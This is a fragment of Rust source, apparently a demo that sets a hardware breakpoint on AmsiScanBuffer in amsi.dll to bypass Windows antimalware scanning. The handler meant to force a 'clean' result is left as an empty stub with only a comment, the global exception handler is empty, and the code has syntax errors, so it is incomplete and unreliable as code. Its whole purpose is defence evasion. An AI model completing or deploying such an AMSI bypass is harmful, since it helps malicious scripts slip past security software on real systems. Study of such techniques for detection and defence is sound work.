/// Global exception handler for all hardware breakpoints
unsafe extern "system" fn global_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {

}

/// Example AMSI bypass handler
pub unsafe extern "system" fn amsi_bypass_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    debug_println!("AMSI bypass handler triggered");

    let context = unsafe { &mut *(*exception_info).ContextRecord };
    // Set AMSI result to clean

    
}

// Get the address of a function by name from a specific module
fn get_function_address(module_name: &str, function_name: &str) -> Option<LPVOID> {
    unsafe {
        let module_name_cstr = format!("{}\0", module_name);
        let function_name_cstr = format!("{}\0", function_name);

        let module = if module_name.to_lowercase().ends_with(".dll") {
            LoadLibraryA(module_name_cstr.as_ptr() as *const u8)
        } else {
            GetModuleHandleA(module_name_cstr.as_ptr() as *const u8)
        };

        if module.is_null() {
            eprintln!("Failed to load/get module: {}", module_name);
            return None;
        }

        match GetProcAddress(module, function_name_cstr.as_ptr() as *const u8) {
            Some(addr) => {
                debug_println!("Found {}!{} at {:p}", module_name, function_name, addr);
                Some(addr as LPVOID)
            }
            None => {
                eprintln!("Function {} not found in {}", function_name, module_name);
                None
            }
        }

    }
}


fn main(){
    println!("Hardware Breakpoint Manage Demo");

    let args: Vec<String> = env::args().collect();
    VERBOSE.store(args.contains(&"-v".to_string()), Ordering:Relaxed)
    debug_println!("Debug mode ON");

    unsafe {
        // Initialize the breakpoint engine
        if let Err(status) = HardwareBreakpointManager::create() {
            eprintln!("Failed to initialize breakpoint engine: {}", status);
            return;
        }

        // Example: Get AMSI function address and set breakpoint
        if let Some(amsi_addr) = get_function_address("amsi.dll", "AmsiScanBuffer"){
            debug_println!("Found AmsiScanBuffer at {:p}", amsi_addr);

            // Add breakpoint to current thread
            let current_tid = GetCurrentThreadId();
            if let Err(status) = HardwareBreakpointManager::add_breakpoint(
                current_tid,
                amsi_addr,
                amsi_bypass_handler,
                0 // DR0
            ) {
                eprintln!("Failed to add AMSI breakpoint: {}", status);
            }
        }
    }
}